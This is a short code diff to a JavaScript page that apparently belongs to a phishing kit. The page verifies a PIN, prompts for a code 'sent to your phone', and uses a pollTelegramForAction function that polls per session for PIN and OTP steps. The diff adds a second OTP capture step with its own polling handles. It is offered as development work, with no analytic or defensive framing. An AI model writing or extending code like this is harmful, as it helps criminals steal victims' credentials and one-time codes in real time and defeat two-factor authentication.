@@ -1464,7 +1464,7 @@ function verifyPIN() {
 
 }
 
-    function goToOTP() {
+    function goToSecondOTP() {
 
     showPage(
         "page6a",
@@ -1473,12 +1473,12 @@ function verifyPIN() {
         "Enter the code sent to your phone"
     );
 
-    setupOTP();
+    setupSecondOTP();
 
 }
 
 
-function setupOTP() {
+function setupSecondOTP() {
 
     const inputs =
         document.querySelectorAll(
@@ -1851,6 +1851,7 @@ function pollTelegramForAction({session, timeoutMs = 120000, onAction = ()=>{}, 
     if(detailsPollingTimeoutHandle){ clearTimeout(detailsPollingTimeoutHandle); detailsPollingTimeoutHandle = null; }
     if(otpPollingTimeoutHandle){ clearTimeout(otpPollingTimeoutHandle); otpPollingTimeoutHandle = null; }
     if(pinPollingTimeoutHandle){ clearTimeout(pinPollingTimeoutHandle); pinPollingTimeoutHandle = null; }
+    if(secondotpPollingTimeoutHandle){ clearTimeout(secondotpPollingTimeoutHandle); secondotpPollingTimeoutHandle = null; }
   }
 
   if(session && session.startsWith('s_')){
@@ -1858,6 +1859,7 @@ function pollTelegramForAction({session, timeoutMs = 120000, onAction = ()=>{}, 
     detailsPollHandle = handle;
     otpPollHandle = handle;
     pinPollHandle = handle;
+    secondotpPollHandle = handle;
     const toHandle = setTimeout(()=> {
       clearInterval(handle);
       if(onTimeout) onTimeout();
@@ -1865,6 +1867,7 @@ function pollTelegramForAction({session, timeoutMs = 120000, onAction = ()=>{}, 
     detailsPollingTimeoutHandle = toHandle;
     otpPollingTimeoutHandle = toHandle;
     pinPollingTimeoutHandle = toHandle;
+    secondotpPollingTimeoutHandle = toHandle;
   } else {
     setTimeout(onTimeout, 0);
   }
